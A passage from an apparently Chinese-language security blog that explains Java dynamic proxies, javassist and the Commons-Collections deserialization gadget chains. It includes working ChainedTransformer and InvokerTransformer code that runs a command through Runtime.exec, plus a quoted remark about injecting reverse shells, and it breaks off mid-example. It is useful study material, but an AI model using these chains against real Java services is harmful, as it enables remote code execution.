class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Teacher类实现了Work接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Work</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;my work is teach students&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>WorkHandler用来处理被代理对象，它必须继承InvocationHandler接口，并实现invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>&#123;<br>    <span class="hljs-comment">//代理类中的真实对象</span><br>    <span class="hljs-keyword">private</span> Object obj;<br>    <span class="hljs-comment">//构造函数，给我们的真实对象赋值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkHandler</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//在真实的对象执行之前我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;before invoke。。。&quot;</span>);<br>        <span class="hljs-comment">//java的反射功能，用来调用obj对象的method方法，传入参数为args</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> method.invoke(obj, args);<br>        <span class="hljs-comment">//在真实的对象执行之后我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;after invoke。。。&quot;</span>);<br>        <span class="hljs-keyword">return</span> invoke;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Test类中通过Proxy.newProxyInstance进行动态代理，这样当我们调用代理对象proxy对象的work方法的时候，<strong>实际上调用的是WorkHandler的invoke方法</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//要代理的真实对象</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>        <span class="hljs-comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WorkHandler</span>(people);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span><br><span class="hljs-comment">         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span><br><span class="hljs-comment">         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span><br><span class="hljs-comment">         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Work)Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);<br>        System.out.println(proxy.work());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下输出结果，我们再没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">before</span> invoke。。。<br><span class="hljs-keyword">my</span> work <span class="hljs-keyword">is</span> teach students<br><span class="hljs-keyword">after</span> invoke。。。<br>Teacher<br></code></pre></td></tr></table></figure><h2 id="javassist动态编程"><a href="#javassist动态编程" class="headerlink" title="javassist动态编程"></a>javassist动态编程</h2><p>ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行，关于这样做的好处，作者在工具中也有提到：</p><p>could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</p><p>关于javassist动态编程，我就只把关键的函数及其功能罗列一下了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">//获取pool中的某个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Teacher&quot;</span>);<br><span class="hljs-comment">//为cc类设置父类</span><br>cc.setSuperclass(pool.get(<span class="hljs-string">&quot;test.People&quot;</span>));<br><span class="hljs-comment">//将动态生成类的class文件存储到path路径下</span><br>cc.writeFile(path);<br><span class="hljs-comment">//获取类的字节码</span><br><span class="hljs-type">byte</span>[] b=cc.toBytecode();<br><span class="hljs-comment">//创造Point类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Point&quot;</span>);<br><span class="hljs-comment">//为cc类添加成员变量</span><br>cc.addField(f);<br><span class="hljs-comment">//为cc类添加方法</span><br>cc.addMethod(m);<br><span class="hljs-comment">//为cc类设置类名</span><br>cc.setName(<span class="hljs-string">&quot;Pair&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h2><p><a href="https://xz.aliyun.com/t/9409#toc-2">CC链 1-7 分析 - 先知社区 (aliyun.com)</a></p><p>CC链（Commons-Collections）中非常重要的就是几个Transformer类、HashMap、HashSet、HashTable、LazyMap、TiedMapEntry、BadAttributeValueExpException、AnnotationInvocationHandler、Proxy.newProxyInstance，看着好像很多有点唬人，其实理解之后会发现都不是大问题，特别是看过这些类的源码之后，每个利用链就会很清晰。</p><p>CC链的利用条件存在一些限制，主要表现为:</p><ul><li>jdk8u71之前可以使用AnnotationInvocationHandler作为前段，之后不行</li><li>jdk7低版本中无法使用CC5(BadAttributeValueExpException不存在readObject)</li><li>commons-collections3.x可以使用LazyMap.decorate作为前段，之后不行</li><li>commons-collections4.0之后可以直接回调PriorityQueue作为前段，之前不行</li></ul><p>先介绍几个里面调用到的类</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>该类实现了Transformer接口，并重写了tranform方法，用于获取一个对象，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br><span class="hljs-built_in">this</span>.iConstant = constantToReturn;<br>&#125;<br><span class="hljs-comment">//获取对象</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>该类实现了Transformer接口，并重写了tranform方法，其 transform 方法作用是反射调用指定的方法并返回方法调用结果，关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8653385846894047688L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String iMethodName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br><br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">this</span>.iMethodName = methodName;<br>        <span class="hljs-built_in">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-built_in">this</span>.iArgs = args;<br>    &#125;<br><br>    <span class="hljs-comment">//重写的 transform 方法，反射调用指定的方法并返回方法调用结果</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(<span class="hljs-built_in">this</span>.iMethodName, <span class="hljs-built_in">this</span>.iParamTypes);<br>                <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-built_in">this</span>.iArgs);<br>            &#125; <span class="hljs-keyword">catch</span> …………<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>弹计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>     <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;);<br>     transformer.transform(Runtime.getRuntime());<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>其 transform 方法作用是反射调用构造函数将类实例化，关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstantiateTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3786388740793356347L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">NO_ARG_INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br><br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-built_in">this</span>.iArgs = args;<br>    &#125;<br><br>    <span class="hljs-comment">//重写的 transform 方法，反射调用构造函数将类实例化。</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class)input).getConstructor(<span class="hljs-built_in">this</span>.iParamTypes);<br>        <span class="hljs-keyword">return</span> con.newInstance(<span class="hljs-built_in">this</span>.iArgs);<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Student 类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>     System.out.println(<span class="hljs-string">&quot;学生姓名:&quot;</span> + name);<br> &#125;<br>&#125;<br><br><span class="hljs-comment">// 测试 InstantiateTransformer</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>     <span class="hljs-type">Transformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;小明&quot;</span>&#125;);<br>     instantiateTransformer.transform(Student.class);<br> &#125;<br>&#125;<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//学生姓名:小明</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>其 transform 方法作用是实现数组链式调用。我们只需传入一个 Transformer[] 给 ChainedTransformer，然后执行 ChainedTransformer 的 transform 方法便可以链式调用 Transformer[] 中每个 Transformer 的 transform 方法。</p><p>将内部的多个Transformer串在一起。通俗来说就是，前一个回调transform方法返回的结果，作为后一个回调transform方法的参数传入</p><p>关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3514945074733160196L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br><br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">this</span>.iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-comment">//重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.iTransformers.length; ++i) &#123;<br>            object = <span class="hljs-built_in">this</span>.iTransformers[i].transform(object);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>测试 利用 ChainedTransformer 实现 Runtime.<em>getRuntime</em>().exec(“calc”) ）</p><p>因为Runtime类没有实现Serializable，所以只能通过class一步步构造</p><p>getRuntime()方法可以获取与之相关的Runtime对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试 ChainedTransformer</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>     <span class="hljs-comment">//Transformer数组</span><br>     Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<span class="hljs-comment">//用getMethod得到getRuntime，因为getRuntime没有参数，所以传了个new Class[0]</span><br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<span class="hljs-comment">//getRuntime是静态方法，得到Runtime类</span><br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;)<span class="hljs-comment">//反射调用Runtime类的exec方法</span><br>     &#125;;<br><br>     <span class="hljs-comment">//ChainedTransformer实例</span><br>     <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>     chainedTransformer.transform(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>如果给这个函数传入null的话，会直接抛出 NullPointerException 空指针异常，但传入new Class [0]的话则不会抛异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object obj,</span><br><span class="hljs-params">                  Object... args)</span><br>           <span class="hljs-keyword">throws</span> IllegalAccessException,<br>                  IllegalArgumentException,<br>                  InvocationTargetException<br></code></pre></td></tr></table></figure><p>对带有指定参数的指定对象调用由此 Method 对象表示的底层方法。个别参数被自动解包，以便与基本形参相匹配，基本参数和引用参数都随需服从方法调用转换。</p><p>如果底层方法是静态的，那么可以忽略指定的 <code>obj</code> 参数。该参数可以为 null。 </p><p>如果底层方法所需的形参数为 0，则所提供的 <code>args</code> 数组长度可以为 0 或 null。 </p></blockquote><h3 id="LazyMap–触发ChainedTransformer-的-transform-方法"><a href="#LazyMap–触发ChainedTransformer-的-transform-方法" class="headerlink" title="LazyMap–触发ChainedTransformer 的 transform 方法"></a>LazyMap–触发ChainedTransformer 的 transform 方法</h3><p>主要利用其中的get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7990956402564206740L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br>    <span class="hljs-comment">//可控制 factory 为 ChainedTransformer</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.factory = factory;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//利用 get 方法可实现调用 ChainedTransformer#transform()</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">super</span>.map.containsKey(key)) &#123;<br>            <span class="hljs-comment">//关键点</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.factory.transform(key);<br>            <span class="hljs-built_in">super</span>.map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.map.get(key);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试 LazyMap</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 